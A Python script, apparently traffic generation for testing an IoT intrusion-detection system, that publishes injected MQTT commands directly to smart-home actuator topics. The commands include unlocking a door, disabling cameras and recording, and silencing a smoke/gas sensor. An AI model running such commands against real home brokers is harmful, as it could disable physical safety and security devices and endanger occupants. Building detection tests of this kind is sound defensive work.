"""
Injection Attack: Bypasses the CPU and publishes commands directly to
actuator control topics, attempting to manipulate physical devices.

IDS should detect: topic_acl violation, direct_actuator_access
"""

import time
import paho.mqtt.client as mqtt

INJECTED_COMMANDS = [
    ("home/door/control", "unlock"),
    ("home/door/control", "force_open"),
    ("home/lighting/control", "strobe"),
    ("home/thermo/control", "max_heat"),
    ("home/camera/control", "off"),
    ("home/camera/control", "disable_recording"),
    ("home/smart-plug/control", "on"),
    ("home/smart-plug/control", "surge"),
    ("home/Smoke-Gas-Sensor/control", "silence"),
    ("home/Smart-Speaker/control", "play_malicious_audio"),
    ("home/Smart-Air-Purifier/control", "stop"),
    ("home/Smart-Doorbell/control", "disable"),
]


def run(broker_ip, duration=20, interval=2.0):
    """Injection attack: send commands directly to actuators."""
    print(f"[ATTACK] Injection - Connecting to {broker_ip}")

    client = mqtt.Client(client_id="injector-node")
    client.connect(broker_ip, 1883, 60)
    client.loop_start()

    end_time = time.time() + duration
    count = 0
    idx = 0

    print(f"[ATTACK] Injection - Sending direct actuator commands for {duration}s")
    while time.time() < end_time:
        topic, command = INJECTED_COMMANDS[idx % len(INJECTED_COMMANDS)]
        client.publish(topic, command)
        print(f"  -> {topic}: {command}")
        count += 1
        idx += 1
        time.sleep(interval)

    client.loop_stop()
    client.disconnect()
    print(f"[ATTACK] Injection complete. Sent {count} commands.")
    return count
